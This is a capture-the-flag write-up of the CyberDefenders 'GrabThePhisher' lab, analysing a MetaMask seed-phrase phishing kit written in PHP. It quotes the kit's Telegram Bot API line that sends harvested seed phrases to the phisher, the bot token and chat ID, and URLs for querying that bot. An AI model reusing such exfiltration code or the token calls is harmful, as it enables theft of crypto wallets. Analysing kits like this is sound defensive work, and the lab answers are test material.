I solved the challenge "grabthephisher" on cyberdefenders.org. In this article, I will share my solution to the puzzles.

Solution

1. Which wallet is used for asking the seed phrase?

The website displays three wallets, and after checking the website directory structure, I found only one directory that contained a suspicious PHP script:

c75-GrabThePhisher\pankewk\metamask\metamask.php

2. What is the file name that has the code for the phishing kit?

The sebsite directory structure contains a script file written in PHP to gather intelligence and data from the user.

3. In which language was the kit written?

The script is written in PHP.

4. What service does the kit use to retrieve the victim’s machine information?

The code of the script shows that the phisher is using the Sypex Geo service to gather intelligence:

$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']);

5. How many seed phrases were already collected?

The script is appending data in a log file named log.txt, located in the root directory of the webpage. The file contains three seed phrases.

6. Write down the seed phrase of the most recent phishing incident?

Since the script is appending data to the log file using the FILE_APPEND option, the last written value written in log file will have the seed phrase.

7. Which medium had been used for credential dumping?

The script uses the Telegram Bot API, as seen in Line 34:

$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";

8. What is the token for the channel?

The token is stored in a variable named $token in Line 33:

$token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10";

9. What is the chat ID of the phisher’s channel?

The chat ID is stored in a variable named $id in Line 32:

$id = "5442785564";

10. What are the allies of the phish kit developer?

The author of the phishing script left a message in the file, which reads:

/*
With love and respect to all the hustler out there,
This is a small gift to my brothers,
All the best with your luck,

Regards,
j1j1b1s@m3r0

*/

11. What is the full name of the Phish Actor?

Since the phish actor name wasn't mentioned in the php script, i checked the Telegram Bot api which the token and channel ID.

https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat?chat_id=5442785564

How I ended on this URL is as below.
Access the URL mentioned in the script.

https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/sendMessage?chat_id=5442785564

Got error as bad request method. Looked up in the Telegram Bot request method.

https://core.telegram.org/bots/api
